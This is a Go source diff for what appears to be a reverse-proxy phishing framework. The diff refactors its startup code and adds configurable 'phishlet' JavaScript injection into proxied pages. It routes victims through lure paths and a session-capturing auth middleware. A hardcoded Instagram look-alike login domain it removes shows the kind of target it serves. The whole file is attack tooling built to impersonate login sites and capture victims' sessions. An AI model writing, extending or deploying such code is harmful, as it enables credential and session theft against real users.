@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"os"
 	"runtime/debug"
+	"strings"
 	"time"
 
 	"github.com/gofiber/fiber/v2"
@@ -59,44 +60,28 @@ func setupRequestProcessor(conv DomainConverter) RequestProcessor {
 	return NewRequestProcessor(conv, requestURLProc)
 }
 
-func setupResponseProcessor(conv DomainConverter) ResponseProcessor {
-	htmlProc := newHTMLRegexProcessor(conv, changeURLScript+fetchHookScript)
+func setupResponseProcessor(conf *appConfig, conv DomainConverter) ResponseProcessor {
+	baseScript := fmt.Sprintf(`
+	var baseDomain = "%s"
+	var apiURL = "https://%s"`, conf.DomainNameWithPort, conf.APIHostname)
+	scripts := []string{baseScript, changeURLScript, fetchHookScript}
+	scripts = append(scripts, conf.Phishlet.JsFilesBody...)
+	injectScript := strings.Join(scripts, "\n")
+	htmlProc := newHTMLRegexProcessor(conv, injectScript)
 	responseURLProc := newURLRegexProcessor(func(domain string) string {
 		return conv.ToProxyDomain(domain)
 	})
 	return NewResponseProcessor(conv, responseURLProc, htmlProc)
 }
 
-type hostFS struct{}
-
-func (hostFS) Open(name string) (fs.File, error) {
-	return os.Open(name)
+func setupProxyHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
+	client := setupHTTPClient()
+	req := setupRequestProcessor(conv)
+	resp := setupResponseProcessor(conf, conv)
+	return NewProxyHandler(client, req, resp)
 }
 
-//nolint:funlen
-func main() {
-	var configFile, envFile string
-	flag.StringVar(&configFile, "c", "", "yaml config file")
-	flag.StringVar(&envFile, "e", "", "dotenv config file")
-	flag.Parse()
-	if envFile == "" {
-		if _, err := os.Stat(".env"); err == nil {
-			envFile = ".env"
-		}
-	}
-
-	fsys := &hostFS{}
-	conf, err := parseAppConfig(fsys, configFile, envFile)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	client := setupHTTPClient()
-
-	conv := setupDomainConverter(conf)
-	req := setupRequestProcessor(conv)
-	resp := setupResponseProcessor(conv)
-
+func setupAuthHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
 	cookieManager := NewCookieManager()
 	storage := NewSessionStorage(memory.New(), cookieManager)
 	store := session.New(session.Config{
@@ -107,7 +92,17 @@ func main() {
 		CookieHTTPOnly: true,
 		Storage:        storage,
 	})
+	return NewAuthMiddleware(AuthConfig{
+		CookieName:     conf.SessionCookieName,
+		CookieManager:  cookieManager,
+		Store:          store,
+		InvalidAuthURL: conf.Phishlet.InvalidAuthURL,
+		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
+		LureService:    NewStaticLureService([]string{"/abc/def"}),
+	})
+}
 
+func setupApp(api, auth, proxy fiber.Handler) *fiber.App {
 	app := fiber.New(fiber.Config{
 		StreamRequestBody:     true,
 		DisableStartupMessage: true,
@@ -121,20 +116,6 @@ func main() {
 			log.Println("stack: ", utils.UnsafeString(debug.Stack()))
 		},
 	}))
-	auth := NewAuthMiddleware(AuthConfig{
-		CookieName:     conf.SessionCookieName,
-		CookieManager:  cookieManager,
-		Store:          store,
-		InvalidAuthURL: "https://duckduckgo.com",
-		LoginURL:       fmt.Sprintf("https://www-instagram-com.%s/", conf.DomainNameWithPort),
-		LureService:    NewStaticLureService([]string{"/abc/def"}),
-	})
-	proxy := NewProxyHandler(client, req, resp)
-
-	api := NewAPIMiddleware(APIConfig{
-		APIHostname:     "api." + conf.DomainNameWithPort,
-		DomainConverter: conv,
-	})
 
 	// allowed HTTP methods with auth
 	httpMethods := []string{
@@ -150,7 +131,41 @@ func main() {
 	}
 	// for CORS preflight requests
 	app.Options("/*", api, proxy)
+	return app
+}
 
+type hostFS struct{}
+
+func (hostFS) Open(name string) (fs.File, error) {
+	return os.Open(name)
+}
+
+func main() {
+	var configFile, envFile string
+	flag.StringVar(&configFile, "c", "", "yaml config file")
+	flag.StringVar(&envFile, "e", "", "dotenv config file")
+	flag.Parse()
+	if envFile == "" {
+		if _, err := os.Stat(".env"); err == nil {
+			envFile = ".env"
+		}
+	}
+
+	fsys := &hostFS{}
+	conf, err := setupAppConfig(fsys, configFile, envFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	conv := setupDomainConverter(conf)
+	api := NewAPIMiddleware(APIConfig{
+		APIHostname:     conf.APIHostname,
+		DomainConverter: conv,
+	})
+	auth := setupAuthHandler(conf, conv)
+	proxy := setupProxyHandler(conf, conv)
+
+	app := setupApp(api, auth, proxy)
 	if err := app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey); err != nil {
 		log.Println("listen error", err)
 	}
